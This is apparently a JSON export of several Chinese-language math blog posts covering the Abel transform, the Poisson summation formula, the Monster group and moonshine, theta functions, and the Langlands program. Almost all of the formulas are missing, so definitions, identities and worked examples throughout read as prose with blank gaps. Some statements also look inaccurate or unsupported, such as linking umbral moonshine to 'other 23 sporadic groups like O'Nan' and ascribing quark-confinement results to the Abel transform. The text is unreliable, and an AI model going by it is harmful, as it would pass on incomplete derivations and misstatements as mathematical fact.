阿贝尔积分变换，其定义为： 这一变换适用于处理球对称或轴对称问题，要求 在无穷远处满足 以保证积分收敛。其逆变换公式为： 这种积分变换在光学、等离子体物理等领域用于从观测的辐射强度反推发射系数的径向分布。 关键性质与分析工具阿贝尔引理与收敛性估计阿贝尔变换的重要应用之一是建立级数收敛性的判别准则。阿贝尔引理指出：若数列 单调有界（不妨设非递增），且部分和序列 满足 ，则： 证明直接应用恒等式 并利用三角不等式： 由于 单调，差分项同号，故求和可简化为 ，从而得到式 。这一引理是阿贝尔判别法和狄利克雷判别法的核心工具，后者在判断形如 的级数收敛性时尤为有效 —— 当 单调趋于零且 有界时，级数收敛。 阿贝尔不等式与误差估计在数值分析中，阿贝尔变换提供了估计部分和误差的有效手段。对于单调递减的正数列 和有界部分和 ，有： 这一不等式表明，当 足够小时，尾部和可以被有效控制。在素数定理的证明中，正是利用这一性质估计 的余项，其中 是冯・曼戈尔特函数。 应用场景与实例分析数论中的核心应用阿贝尔变换在数论中具有奠基性地位。以黎曼 ζ 函数的对数形式为例： 通过引入素数计数函数 ，可将其转化为斯蒂尔杰斯积分： 应用阿贝尔变换（分部积分）后得到： 这一公式建立了 函数与素数分布的直接联系，是素数定理证明的关键步骤。式 右侧积分的解析性质研究促使黎曼提出了关于 函数零点分布的著名猜想。 物理问题中的积分变换在等离子体物理中，观测到的辐射强度 与发射系数 的径向分布满足阿贝尔积分变换关系： 其中 是等离子体半径。通过逆变换公式 ，可从实验测量的 反推 的分布。这种反演在惯性约束聚变（ICF）实验中用于诊断等离子体的温度和密度剖面，是间接驱动方案中靶丸压缩对称性分析的核心技术。 经典求和问题的统一解法阿贝尔变换为传统的幂和问题提供了系统化处理方法。例如计算平方和 ，令 ， ，则 ，应用变换公式 ： 右侧第二项展开后包含 ，解方程可得： 这一过程避免了传统的代数递推法，展现了阿贝尔变换处理多项式求和的普适性。类似地，等比 - 等差乘积数列 的求和也可通过令 （等差）， （等比），利用部分和 快速求解。 现代拓展与前沿应用高维阿贝尔变换与成像科学在三维轴对称问题中，阿贝尔变换被推广为二维形式。对于柱坐标下的函数 ，其二维阿贝尔变换定义为： 这一变换在医学成像（如 PET 扫描）和光学断层成像中用于从投影数据重建三维结构。2024 年的最新研究表明，结合深度学习的阿贝尔变换数值反演算法可将传统方法的计算复杂度从 降至 ，为实时成像提供了可能。 量子场论中的应用在量子场论的路径积分表述中，阿贝尔变换用于处理费米子行列式的离散求和。通过将格点上的乘积项转化为连续积分，研究者成功将夸克禁闭问题与阿贝尔规范场的拓扑性质联系起来。这种离散 - 连续的转换正是阿贝尔原始思想在高能物理中的现代演绎。 总结与展望阿贝尔变换从诞生至今已历经两个世纪，但其核心思想，通过引入中间序列（部分和）实现求和项的重组，依然展现出强大的生命力。从离散的数论问题到连续的物理场论，从纯数学的级数收敛性到应用科学的成像技术，这一变换始终扮演着连接不同数学分支的桥梁角色。 当代研究的前沿方向包括：高维阿贝尔变换的快速数值算法、量子场论中的非交换推广、以及机器学习中基于阿贝尔变换的特征提取方法。特别值得注意的是，2021 年提出的改进 Gauss-Legendre 算法，将阿贝尔变换的数值精度提升了一个量级，为等离子体物理的精密诊断提供了新工具。正如阿贝尔本人在椭圆函数领域的开创性工作一样，这一看似简单的变换公式，仍在不断启发着数学与物理的交叉创新。 阿贝尔变换的真正魅力，或许在于其揭示的数学统一性，离散与连续、有限与无限、纯粹与应用，在此找到了和谐的交汇点。对于当代研究者而言，掌握这一工具不仅意味着解决具体问题的能力，更在于获得一种跨越不同数学分支的思维方式。"},{"title":"","date":"2025-10-11T00:02:00.000Z","updated":"2025-10-11T00:05:00.000Z","comments":true,"path":"notes/Zeta/46.html","permalink":"https://blog.mhuig.top/notes/Zeta/46","excerpt":"","text":"泊松求和公式 泊松求和公式 在数学分析的殿堂中，泊松求和公式如同一座精巧的桥梁，连接着离散与连续两个看似割裂的世界。这个由法国数学家西蒙・德尼・泊松于 19 世纪初提出的公式，不仅在调和分析中占据核心地位，更在数论、信号处理、量子力学等领域展现出深刻的应用价值。它揭示了一个惊人的事实：一个函数在整数点处的离散求和，等于其傅里叶变换在相应频率点处的离散求和，这种对偶性为解决各类复杂问题提供了全新视角。 历史背景与数学语境泊松求和公式的诞生源于 19 世纪初数学界对傅里叶分析的探索热潮。1823 年，泊松在研究热传导方程时首次提出这一公式的雏形，最初用于处理周期函数的傅里叶级数展开问题。当时的数学界正处于从微积分向更系统的分析学过渡的阶段，傅里叶级数的发现（1807 年）为处理周期现象提供了强大工具，而泊松求和公式则进一步将这种周期性分析推广到了离散与连续的交互领域。 随着 20 世纪调和分析的发展，数学家们逐渐认识到该公式的深层意义，它本质上是紧群上傅里叶分析的一个特例。在现代数学框架下，泊松求和公式可以视为局部紧阿贝尔群上 Pontryagin 对偶理论的直接推论，将有限阿贝尔群上的傅里叶变换理论自然推广到无穷离散群 与其对偶群 （圆周群）的情形。这种观点不仅统一了公式的各种表现形式，更为其在数论中的深刻应用（如模形式理论、黎曼 函数的函数方程）奠定了基础。 严格定义与函数空间要理解泊松求和公式，首先需要明确其适用的函数类。最经典的情形是考虑 Schwartz 速降函数空间 中的元素，这类函数具有任意阶导数且在无穷远处比任何多项式的倒数都更快地趋于零。 定义（Schwartz 空间）：函数 属于 Schwartz 空间 ，若对任意非负整数 ，都有 其中 表示 的 阶导数。 Schwartz 空间的重要性在于它对傅里叶变换封闭，即若 ，则其傅里叶变换 也属于 ，这确保了公式两边的级数均绝对收敛。 泊松求和公式（标准形式）：设 ，其傅里叶变换定义为 则有 其中 均为整数。 更一般地，对于周期为 的情形，公式可推广为： 特别地，当 且 时即得到标准形式。 三种视角的严格推导1. 周期函数的傅里叶级数法这是最经典的证明方法，通过构造周期函数并分析其傅里叶系数来建立等式。 证明：定义周期函数 ，显然 ，故可展开为傅里叶级数： 其中傅里叶系数 作变量替换 ，当 时 ，故 因此 ，令 即得 证毕。 2. 狄拉克梳状函数的傅里叶变换法从广义函数（分布）的角度，可以更直观地理解公式的本质，它反映了时域采样与频域采样之间的对偶关系。 考虑狄拉克梳状函数（Dirac comb） 其中 为狄拉克 函数。其傅里叶变换为 对函数 与梳状函数作卷积，得到 的周期延拓： 两边取傅里叶变换并利用卷积定理 ，有 取逆傅里叶变换并令 ，即得一般形式的泊松求和公式： 当 时即为标准形式。 3. 欧拉 - 麦克劳林求和公式法这种证明方法更具分析学色彩，通过将离散求和转化为积分与余项的和，再利用傅里叶级数表示余项。 欧拉 - 麦克劳林公式：对于在 上连续可微的函数 ，有 其中 是 floor 函数（不大于 的最大整数）。 对于速降函数 ，取 时边界项 趋于零，故 注意到 是周期为 的奇函数，其傅里叶级数为 代入积分并交换求和与积分次序（由控制收敛定理保证），得 对积分作分部积分，最终可得 这种证法揭示了泊松求和公式与数值积分中余项估计的深刻联系。 推广形式与边界情形1. 缓增分布意义下的推广泊松求和公式可以从 Schwartz 函数推广到更一般的缓增分布（tempered distributions）。对于 ，若 作为周期分布收敛，则有 这种推广使得公式可应用于如 函数、多项式等非速降函数，但需在分布意义下理解级数收敛。 2. 高维泊松求和公式公式可自然推广到 上：设 ，则 其中 是 维傅里叶变换。这一推广在自守形式、晶体学等领域有重要应用。 3. 带参数的泊松求和公式考虑高斯函数族 （ ），其傅里叶变换为 。代入泊松求和公式得到 这正是 theta 函数 的函数方程 ，是模形式理论的基石之一。 深刻应用与数学连接1. 黎曼 函数的解析延拓泊松求和公式为黎曼 函数提供了关键的解析延拓方法。考虑 函数与 函数的关系： 对等式 两边积分并作变量替换，可得到 的函数方程： 这一方程揭示了 函数在临界线 上的对称性，是黎曼假设的核心背景。 2. 双曲余切的洛朗展开利用泊松求和公式可推导双曲余切函数的无穷级数展开。考虑函数 （ ），其傅里叶变换为 代入泊松求和公式得 左侧即 ，因此 这一展开在复分析中用于计算极点留数，在统计力学中用于处理晶格振动问题。 3. 椭圆函数与模形式在椭圆函数理论中，魏尔斯特拉斯 函数定义为 其傅里叶展开可通过泊松求和公式推导，揭示了椭圆函数的双周期性与模变换性质。高维情形下，泊松求和公式是自守形式理论中塞尔伯格迹公式的特例，后者在数论和表示论中具有里程碑意义。 4. 信号处理中的采样定理在工程应用中，泊松求和公式直接导出了奈奎斯特采样定理。对于带宽限制在 内的信号 （即当 时 ），公式给出 取 （奈奎斯特频率），则右侧仅剩 项，即 可由其采样值完全重构： 这一结果奠定了数字信号处理的理论基础。 典型算例与数值验证例 1：高斯函数求和设 ，则 ，由泊松求和公式得 这看似平凡，但对 考虑 ，则 ，从而 当 时即得 ，当 时可计算左侧 ，右侧 ，验证了公式的正确性。 例 2： 的求和取 ，其傅里叶变换为 ，代入泊松求和公式得 左侧为 ，右侧 ，与 的数值吻合，这实际上给出了 的一个快速计算方法。 例 3：余切函数的部分分式展开考虑 （ ），其傅里叶变换可通过留数定理计算，代入泊松求和公式后取极限 ，可得到经典的余切展开式： 这一公式在复分析中用于计算实积分，例如 。 结语：数学统一性的典范泊松求和公式的魅力不仅在于其优美的形式和广泛的应用，更在于它揭示了数学不同分支之间的深刻联系。从分析学中的傅里叶变换到数论中的模形式，从信号处理的采样定理到量子场论中的卡西米尔效应，这一公式如同一条隐藏的线索，将看似分散的数学领域编织成一个有机整体。 对于现代数学家而言，泊松求和公式的意义已远超其原始形式，它代表着一种对偶思维，即通过变换将难以处理的离散问题转化为连续问题，反之亦然。这种思维方式在机器学习（如傅里叶特征映射）、密码学（格基密码）等新兴领域中正展现出蓬勃的生命力。数学中最美妙的时刻，往往是不同分支的思想交汇之时，而泊松求和公式无疑是这种交汇的璀璨结晶。 在未来，随着非交换调和分析、量子计算等领域的发展，我们有理由相信，泊松求和公式这一经典工具将继续焕发新的活力，为探索数学宇宙的未知疆域提供指引。"},{"title":"","date":"2025-10-11T01:15:00.000Z","updated":"2025-10-11T01:20:00.000Z","comments":true,"path":"notes/Zeta/48.html","permalink":"https://blog.mhuig.top/notes/Zeta/48","excerpt":"","text":"魔群 魔群 在有限群论的浩瀚星海中，魔群（Monster Group）如同一颗神秘的超新星，以其 个元素的庞大身躯和深邃的数学内涵，成为 个散在单群中最引人注目的存在。这个被称为 \"友善巨人\"（Friendly Giant）的代数结构，不仅是有限单群分类定理的巅峰之作，更通过 \"魔群月光猜想\"（Monstrous Moonshine）架起了连接群论、数论与理论物理的桥梁。这里将从历史背景出发，系统阐述魔群的构造原理、表示理论及其深远的数学影响，揭示这个抽象代数对象如何成为理解数学统一性的关键钥匙。 历史渊源：从散在单群到 \"月光\" 的发现魔群的故事始于 20 世纪中期有限单群分类的宏大工程。当数学家们逐渐意识到大多数有限单群可归入 个无限家族时， 个无法被归类的 \"散在单群\"（sporadic simple group）成为分类定理最后的谜题。1973 年，德国数学家贝恩德・费歇尔（Bernd Fischer）首先预测了一个包含他所发现的 3 - 传递群的巨大单群存在，而美国数学家罗伯特・格里斯（Robert Griess）则独立开展了构造工作。这场数学长征的关键突破出现在 1978 年，康考迪亚大学的约翰・麦凯（John McKay）偶然发现，数论中著名的 j 函数傅里叶展开式的第一个非平凡系数 ，恰好等于魔群最小非平凡不可约表示维数 与平凡表示维数 1 之和。 这一惊人巧合起初被视为数学猎奇，直到 1979 年，菲尔兹奖得主约翰・汤普森（John Thompson）进一步验证了 j 函数更高阶系数与魔群表示维数的关联：j 函数的第二个系数 等于 ，其中 正是魔群的第三个不可约表示维数。这些发现促使约翰・康威（John Conway）与西蒙・诺顿（Simon Norton）在 1979 年发表了划时代的论文《魔群月光》，正式提出魔群月光猜想：存在一个基于魔群的无限维 graded 表示（后称为 \"魔群模\"），其分次维数生成函数恰为 j 函数，且魔群元素的作用对应特定模形式。这一猜想被当时数学家唐・扎吉尔（Don Zagier）形容为 \"可望而不可即\"，因其连接了两个看似毫无关联的数学领域。 魔群本身的构造难题在 1982 年被格里斯攻克，他通过构造一个 196884 维的非结合代数：Griess 代数，证明了魔群作为该代数自同构群的存在性。格里斯的构造异常复杂，涉及 24 维 Leech 格的深刻性质，其代数乘法定义需要处理超过百万项的结构常数。这一成就使魔群获得了 \"Fischer-Griess Monster\" 的正式名称，而康威随后简化的构造揭示了其与 2B 对合中心化子 的关键联系。 数学定义与基本结构阶与单群性质魔群作为有限单群，其阶（元素个数）由汤普森阶公式确定为： 这一数值约为 ，超过可观测宇宙中的原子总数，却能通过严格的群论公理完全确定。作为单群，魔群不包含非平凡正规子群，这一性质使其在有限群分类中处于基础地位 —— 所有有限群都可分解为单群的扩张，正如素数是整数的基本构件。 子群结构与 \"快乐大家族\"魔群的非凡之处在于其包含了 26 个散在单群中的 20 个作为其子群或子商群，康威将这些群称为 \"快乐大家族\"（happy family），而其余 6 个不与魔群相关的散在群则被称为 \"低群\"（pariahs）。这种包含关系通过极大子群实现，已知的 44 个共轭类极大子群中，最著名的包括： ：2B 对合的中心化子，结构为 extraspecial 2 - 群 与 Conway 单群 的半直积 ：2A 对合的中心化子，包含 Baby Monster 群 的双覆盖 ：5 - 局部极大子群，在融合系统研究中至关重要 这些子群的存在使魔群成为散在单群的 \"通约者\"，通过研究魔群的表示可同时获取多个散在群的信息。特别地，魔群的子群格包含了 Mathieu 群、Conway 群、Fischer 群等大多数散在单群，形成一个复杂而有序的对称网络。 Griess 代数与极小表示格里斯在构造魔群时引入的 196884 维 Griess 代数 是理解魔群结构的关键工具。作为非结合交换代数， 具有单位元且满足特殊的容差条件，其自同构群 正是魔群。该代数可分解为平凡表示与 196883 维极小忠实表示的直和： 其中 是魔群的极小忠实表示，其维数比 j 函数的第一个非零系数小 1，这一巧合正是魔群月光猜想的最初线索。康威进一步证明，Griess 代数可通过 Leech 格的顶点算子代数构造，建立了与共形场论的联系。 表示理论与计算实现表示的维数与特征标魔群的表示理论展现出惊人的规律性，其不可约表示维数序列以 1, 196883, 21296876, 842609326, ... 开始，这些数值通过特征标表与模形式系数严格对应。根据月光猜想，这些维数生成函数满足： 其中 为椭圆模函数， 是魔群模 的分次维数， 。博赫茲（Richard Borcherds）在 1992 年证明这一猜想时，引入了 Monster Lie algebra，一个具有 - 分次结构的广义 Kac-Moody 代数，其根空间维数恰由 给出。 计算挑战与算法突破由于最小忠实表示维数高达 196882，直接存储魔群元素的矩阵表示在计算上不可行。早期计算机实现依赖于 3 - 局部子群或 2 - 局部子群构造，如 Linton 等人 1998 年基于 的方法。2024 年，Martin Seysen 提出的新算法通过模 15 约化表示 ，将随机元素乘法时间缩短至 30 毫秒，比 Wilson 2013 年的估计快 10 万倍。 该算法的核心思想是构造三个特殊向量 ，使得任意魔群元素 可由其在这些向量上的作用唯一确定。通过将 表示为生成元 上的字，并利用 Griess 代数的几何性质缩短字长，实现了高效存储（ 比特 / 元素）与运算。这一突破使得大规模魔群计算成为可能，如 Dietrich 等人 2024 年利用该算法完成了魔群极大子群的分类。 月光猜想与数学统一性博赫茲的证明与广义 Kac-Moody 代数1992 年，博赫茲通过引入 Monster Lie algebra 完成了魔群月光猜想的证明，这一成就为他赢得了 1998 年菲尔兹奖。Monster Lie algebra 是 - 分次的广义 Kac-Moody 代数，其分次分量 满足： 其中 是 Moonshine 模，一个具有魔群作用的顶点算子代数。博赫茲的证明融合了顶点算子代数、no-ghost 定理和弦理论的思想，展示了物理方法在纯粹数学中的深刻应用。特别地，他证明了 Monster Lie algebra 的根空间维数由 j 函数系数给出，从而建立了群论与模形式的根本联系。 伴影月光与数学新前沿魔群月光猜想的证明开启了 \"月光现象\" 的研究热潮。2012 年，程之宁（Miranda Cheng）、约翰・邓肯（John Duncan）与杰弗里・哈维（Jeffery Harvey）提出伴影月光猜想（Umbral Moonshine），预言了 23 种类似的对称群与模形式的对应关系，这些对应与 K3 曲面的弦理论密切相关。2015 年，该猜想的主要情形被证明，揭示了月光现象的普遍性。 … 这些发展促使数学家重新评估数学各分支间的联系。麦凯观察到魔群不可约表示维数与 E8 根系的深刻关联（麦凯 E8 观察），暗示魔群可能编码了弦理论中额外维度的几何信息。当代研究正探索魔群与量子引力、拓扑量子场论的可能联系，将这个抽象代数对象推向现代数学物理的前沿。 魔群与黎曼 Zeta 函数的深层联系虽然魔群与黎曼 Zeta 函数无直接关联，但通过以下路径间接相连： 模形式与 Zeta 函数的共性：J 函数作为模形式，其系数满足类似 Zeta 函数的解析延拓和函数方程，且在数论中常用于研究素数分布（如怀尔斯证明费马大定理时用到的模性猜想）。 Kloosterman-Selberg Zeta 函数：在研究模形式的谱理论时，会涉及这类与群作用轨道相关的 Zeta 函数。例如，Iwaniec 在分析自守格林函数时，通过 Kloosterman 和构造了与魔群子群相关的 Zeta 函数，其极点对应群表示的特征值。 广义月光猜想的扩展：2012 年提出的 “伴影月光猜想”（Umbral Moonshine）发现，除魔群外，其他 23 个散在单群（如 O’Nan 群）也与模形式存在类似对应，部分涉及椭圆曲线的 L 函数（Zeta 函数的推广），甚至可用于证明类数同余和 Selmer 群的性质。 结论：魔群的数学意义与未来展望魔群作为有限单群分类的巅峰成就，其意义远超单纯的群论研究。通过魔群月光猜想，它架起了连接代数、数论与理论物理的桥梁，印证了希尔伯特关于数学统一性的远见。魔群的研究方法，从格里斯代数的显式构造到博赫茲的顶点算子代数证明，再到 Seysen 的高效算法，展示了数学创造力在应对极端复杂问题时的多样化路径。 当前，魔群在融合系统（fusion systems）、高阶范畴论和量子计算中的潜在应用正吸引新的研究兴趣。特别是其 阶 Sylow 5 - 子群上的 exotic 融合系统的发现，挑战了传统的有限群结构理论。随着计算能力的提升和数学物理的发展，这个 \"友善巨人\" 仍将继续揭示宇宙最深层的数学秘密，提醒我们在看似离散的数学对象背后，可能隐藏着统一而和谐的对称规律。 魔群的存在本身就是一个奇迹，它的发现是人类理性最伟大的胜利之一。在探索魔群的征途中，数学家们不仅征服了有限单群分类的最后堡垒，更意外发现了通往数学统一理论的隐秘之门。"},{"title":"","date":"2025-10-11T01:02:00.000Z","updated":"2025-10-11T01:05:00.000Z","comments":true,"path":"notes/Zeta/47.html","permalink":"https://blog.mhuig.top/notes/Zeta/47","excerpt":"","text":"Theta 函数 Theta 函数 Theta 函数作为连接复分析、数论与代数几何的核心工具，其发展历程折射出 19 世纪以来数学思想的深刻变革。1829 年，雅可比在《椭圆函数新理论》中首次系统研究 θ 函数时，或许未曾想到这个源于椭圆积分反演的特殊函数，会在一个世纪后成为破解费马大定理的关键拼图。今天，Theta 函数不仅是构造双周期椭圆函数的基本砖块，更通过黎曼的高维推广成为代数曲线理论的语言，其现代变体 mock theta 函数甚至与弦理论中的黑洞熵计算产生深刻关联。 历史起源：从椭圆周长到双周期函数椭圆积分的研究始于 18 世纪对椭圆弧长的计算。当试图求解椭圆 的周长时，数学家们遇到了如下形式的积分： 其中 这个积分无法用初等函数表示，促使欧拉、勒让德等人发展椭圆积分理论。1827 年，雅可比突破性地将椭圆函数定义为椭圆积分的反函数，类似三角函数是圆积分的反函数。对于第一类不完全椭圆积分： 雅可比定义其反函数为 ，并发现这些函数具有双周期性。为研究这些函数的性质，雅可比将其表示为无穷乘积形式，而这些乘积中蕴含的整函数正是 θ 函数的雏形。 黎曼在 1857 年的博士论文中，将单变量 θ 函数推广至多变量情形，引入了依赖于黎曼矩阵的高维 θ 函数，为代数曲线的雅可比反演问题提供了统一框架。这一推广使得 θ 函数从复分析工具跃升为代数几何的基本语言，其对称性质深刻反映了黎曼曲面的拓扑结构。 定义与基本性质：从单变量到多变量雅可比 Theta 函数经典的雅可比 θ 函数有四个基本类型，均定义为复平面上的整函数。其中第三个 θ 函数最为常用： 其中 ， 保证级数绝对收敛。这个看似简单的级数蕴含着惊人的对称性：它关于 具有拟周期性 和 ，这种双重周期性使其成为构造椭圆函数的理想基石。 通过乘积展开，θ 函数可表示为无穷乘积形式： 这个乘积展开揭示了 θ 函数的零点分布，所有零点均位于 （ ）处，形成复平面上的规则格点。 黎曼 Theta 函数黎曼将雅可比 θ 函数推广至 维复空间，定义为： 其中 ， 是 对称复矩阵，且 正定（称为黎曼矩阵）。这个高维推广保留了关键性质：对任意 ，有 ，而平移 则引入指数因子。黎曼 θ 函数的重要性在于，任何阿贝尔函数（高维椭圆函数的推广）都可表示为 θ 函数的商，这类似于单变量情形下椭圆函数可表示为 θ 函数之商的性质。 核心恒等式与证明：从三重积到模变换Jacobi 三重积恒等式θ 函数理论中最基本的恒等式是雅可比三重积恒等式，它建立了 θ 函数的级数展开与乘积展开之间的桥梁： 这个恒等式的证明可通过构造辅助函数 并分析其傅里叶展开完成。具体而言，通过证明 满足递推关系 ，结合初始条件 ，可得系数 ，从而得到 θ 函数的级数表达式。 Jacobi 恒等式与模形式性质雅可比发现了 θ 函数之间的平方关系： 其中 是另外两个雅可比 θ 函数。这个恒等式可通过考察 θ 函数在 处的取值证明，此时 恰为著名的 Euler 函数。更深刻的是，θ 函数满足模变换性质：当 时，θ 函数经历特定的变换规则，这使它们成为权为 的模形式。 应用与推广：从物理到数论椭圆函数表示利用 θ 函数，所有椭圆函数都可表示为 θ 函数的有理组合。例如雅可比椭圆函数 可表示为： 其中 是椭圆模参数， ， 是第一类完全椭圆积分。这种表示使得椭圆函数的数值计算成为可能，当需要在涉及椭圆函数的问题中获得确定数值结果时，计算最简便的方法是借助 θ 函数。 Mock Theta 函数1920 年，拉马努金在给 Hardy 的最后一封信中提出了 17 个 \"mock theta 函数\"，它们具有模形式的渐近性质但不满足完整的模变换律。直到 2002 年，Zwegers 才揭示其本质：每个 mock theta 函数是权为 的弱调和 Maass 形式的全纯部分，其非全纯部分由 θ 函数构成。这一发现将 mock theta 函数纳入模形式理论框架，使其成为连接数论与物理的新桥梁 —— 最近研究表明，mock theta 函数的系数与黑洞熵计算密切相关。 通信与密码学在应用数学领域，θ 函数的格点结构使其成为通信编码的理想工具。格的 θ 级数 编码了格的距离分布信息，而平坦因子（flatness factor）则量化了格的 \"均匀性\"，这对设计抗噪声的格码至关重要。例如，在计算转发（compute-and-forward）通信协议中，θ 级数的近似 可有效评估格码性能。 前沿问题与挑战尽管 θ 函数已有近 200 年研究历史，许多基本问题仍未解决。在计算数学中，高维黎曼 θ 函数的高效计算仍是开放问题，现有算法需在精度与复杂度间权衡。在数论领域，mock theta 函数的系数同余性质与分拆函数的关系是当前研究热点，例如 3 阶 mock theta 函数 的系数符号变化规律尚未完全揭示。 从椭圆周长计算到弦理论模型，θ 函数始终扮演着数学创新的催化剂角色。正如黎曼矩阵的对称性反映了代数曲线的拓扑结构，θ 函数本身也成为数学不同分支间深刻联系的隐喻，在复分析的表面下，隐藏着数论与几何的深层共鸣。当我们在量子场论的路径积分中遇到 θ 函数的身影，或在密码学的格基归约中应用其性质时，或许正是在回应雅可比当年的洞见：数学最深刻的美，往往体现在看似不同领域的惊人联系之中。"},{"title":"","date":"2025-10-11T03:50:00.000Z","updated":"2025-10-11T03:55:00.000Z","comments":true,"path":"notes/Zeta/49.html","permalink":"https://blog.mhuig.top/notes/Zeta/49","excerpt":"","text":"朗兰兹纲领 朗兰兹纲领 朗兰兹纲领（Langlands Program）是 20 世纪数学最宏伟的蓝图之一，由罗伯特・朗兰兹（Robert Langlands）于 1967 年在给安德烈・韦伊（André Weil）的 17 页手写信中首次提出。这一纲领通过推广傅里叶分析的思想，试图在数论、调和分析与几何学之间建立深刻联系，被爱德华・弗伦克尔（Edward Frenkel）称为 \"数学的大一统理论\"。其核心思想可追溯至韦伊 1940 年狱中构想的 \"数学罗塞塔石碑\"，将数论、几何与函数域视为同一理论的不同语言，而朗兰兹纲领则提供了翻译这些语言的 \"词典\"。 经典傅里叶变换通过将复杂波分解为正弦波的叠加，建立了函数与其频谱之间的对应。朗兰兹将这一思想推广到非交换情形：数论中的伽罗瓦表示（频谱）应当与自守形式（波）一一对应，这种对应通过 L 函数实现。例如，椭圆曲线的 Hasse-Weil L 函数应等同于某权 2 尖点形式的 L 函数，这一特殊情形（谷山 - 志村猜想）正是怀尔斯证明费马大定理的核心。 历史背景与思想起源从二次互反律到非阿贝尔类域论朗兰兹纲领的历史根源可追溯至高斯的二次互反律，该定律揭示了素数模 p 平方剩余性与模 q 平方剩余性的对称性。希尔伯特第 9 问题将其推广至一般数域，而阿廷（Emil Artin）的互反律进一步将伽罗瓦群特征与 L 函数关联。朗兰兹的突破在于将这些结果推广到非阿贝尔伽罗瓦群，提出对任意约化群 G，其自守表示与伽罗瓦群的 Langlands 对偶群 ^LG 的表示存在对应。 1967 年的奠基性信件中，朗兰兹引入了阿廷 - 赫克 L 函数的欧拉积形式： 其中 是自守形式 在局部域上的共轭类， 是复表示。这一构造将数论信息编码为自守形式的傅里叶系数，为后续研究奠定了基础。 几何朗兰兹的诞生1980 年代，弗拉基米尔・德林费尔德（Vladimir Drinfeld）通过引入椭圆模块和量子群，将朗兰兹纲领推广到几何情形。对复数域上的代数曲线 X，几何朗兰兹猜想断言：X 上的 ^LG - 局部系统（伽罗瓦侧）与 Bun_G (X) 上的 Hecke 特征层（自守侧）存在范畴等价。这里 Bun_G (X) 是 X 上 G- 丛的模空间，而 Hecke 特征层是满足特定局部 - 整体相容条件的 D- 模。 这一转变将数论中的素数替换为曲线上的点，将 L 函数替换为层的上同调，使得代数几何工具（如傅里叶 - 穆凯变换）得以应用。德利涅（Pierre Deligne）关于韦伊猜想的工作提供了有限域上的几何 - 数论字典，而贝林森（Alexander Beilinson）与德林费尔德的工作则将共形场论引入几何朗兰兹的研究。 数学框架与核心猜想Langlands 对偶与自守表示对简约代数群 G，其 Langlands 对偶群 ^LG 通过根数据的对偶性定义：若 G 的根系为 (R, X)，则 ^LG 的根系为 (R∨, X∨)，其中 R∨是余根，X∨是余权格。这种对偶性在朗兰兹对应中起关键作用：G 的自守表示对应 ^LG 的伽罗瓦表示。 自守形式的严格定义需要阿代尔群框架。对数域 F，G (A_F) 上的自守形式 φ 需满足： 对紧子群 K 有右 K 不变性； 生成的表示在中心作用下有适度增长； 是赫克代数的本征函数。 赫克代数 H_k 与共轭格的群代数同构： （外尔群不变部分），这一结果将局部表示论与整体自守形式联系起来。 几何朗兰兹的精确表述Beilinson-Drinfeld 将几何朗兰兹猜想表述为 D- 模范畴的等价： 左侧是 Bun_G (X) 上的 D- 模，右侧是 ^LG - 局部系统模空间上的归纳凝聚层。这一等价需满足赫克函子作用的相容性，即局部系统的修改对应于 D- 模的 Hecke 变换。 对 GL (1) 情形，这等价于皮卡簇上的傅里叶 - 穆凯变换，由 Laumon 与 Rothstein 证明。高秩情形的证明依赖于几何 Satake 等价，该等价将仿射 Grassmannian 上的等变 D- 模与对偶群的表示范畴等同。 朗兰兹纲领的层级架构与 Zeta 函数的嵌入朗兰兹纲领的核心是自守表示与伽罗瓦表示的对应，其层级结构可通过一般线性群 的表示刻画，而 Zeta 函数恰是这一体系的基石： 情形：类域论与 Dirichlet L- 函数 当 时，朗兰兹对应退化为经典类域论，即数域的阿贝尔扩张由其理想类群（自守对象）参数化。此时，Zeta 函数的推广形式，Dirichlet L- 函数 对应于 的一维（阿贝尔）伽罗瓦表示，其解析延拓与函数方程可由自守形式理论直接证明。 广义黎曼猜想：狄利克雷 L 函数的所有非平凡零点都位于复平面上 的直线上。 情形：模形式与椭圆曲线的桥梁 谷山 - 志村定理（现已成为怀尔斯证明费马大定理的核心）是首个非阿贝尔朗兰兹对应的实例：椭圆曲线的伽罗瓦表示（二维）与模形式的自守表示共享同一 L- 函数。此时，Zeta 函数升华为 Hasse-Weil L- 函数 其中 ， 为椭圆曲线 模 的有理点数。朗兰兹纲领预言，这一函数必为某个权为 2 的尖点模形式的 L- 函数，从而将几何对象的算术性质转化为模形式的解析性质。 高维推广： 与一般 L- 函数 对 ，朗兰兹猜想 的自守表示 与 维伽罗瓦表示 满足 。例如， 的自守形式可能对应三维伽罗瓦表示，其 L- 函数关联到阿贝尔簇的算术，而 Zeta 函数则作为 时的退化情形被包含其中。 L- 函数的统一与 Zeta 函数的泛化朗兰兹纲领的灵魂在于 L- 函数的函子性：对任意自守表示 与伽罗瓦表示 ，其 L- 函数不仅解析性质一致，更可通过 Rankin-Selberg 卷积 等运算相互作用。例如，黎曼 Zeta 函数的二次扩张版本，戴德金 Zeta 函数： （其中 为数域， 为其素理想）可分解为伽罗瓦群表示的 L- 函数乘积，这正是朗兰兹函子性猜想的算术体现。 扩展黎曼猜想：戴德金 Zeta 函数的所有非平凡零点都位于复平面上 的直线上。 这种统一性为 Zeta 函数的经典问题提供了新思路。例如，黎曼假设（ 的非平凡零点均位于 ）可被视为一般 L- 函数 广义黎曼假设 的特例，而朗兰兹纲领预言，所有自守 L- 函数均满足此性质。 大黎曼猜想：自守 L 函数的所有非平凡零点都位于复平面上 的直线上。 类似地，BSD 猜想 断言椭圆曲线的秩等于其 L- 函数在 处的零点阶数，这一算术命题需通过模形式的解析性质证明，凸显了朗兰兹思想的实践价值。 关键证明技术与 2024 年突破从局部到整体的策略几何朗兰兹猜想的证明历经三十年发展，其关键技术包括： 导出代数几何：Gaitsgory 与 Rozenblyum 发展的∞- 范畴工具，处理模空间的奇异性； 赫克特征层构造：通过共形场论的顶点算子代数，从局部系统生成 D- 模； 庞加莱层与白噪声分解：2022 年 Raskin 与其学生证明庞加莱层可分解所有特征层，解决了 \"振幅相等\" 问题。 2024 年九人团队的证明2024 年 7 月，由 Dennis Gaitsgory 与 Sam Raskin 领导的团队在五篇总计 800 余页的论文中，完成了几何朗兰兹猜想的证明。其核心步骤包括： 建立 IndCoh 范畴的因子化性质，将整体问题约化为曲线各点的局部问题； 证明赫克特征层的存在性，使用 Beilinson-Drinfeld 的 oper 结构与 Feigin-Frenkel 对偶； 验证函数方程，通过庞加莱层的自对偶性与傅里叶变换的相容性。 Peter Scholze 评价这一成果为 \"三十年研究的顶点\"，而 Gaitsgory 本人则将其视为 \"凿下的一块大石头\"，强调后续需探索与量子物理的联系及数论情形的转化。 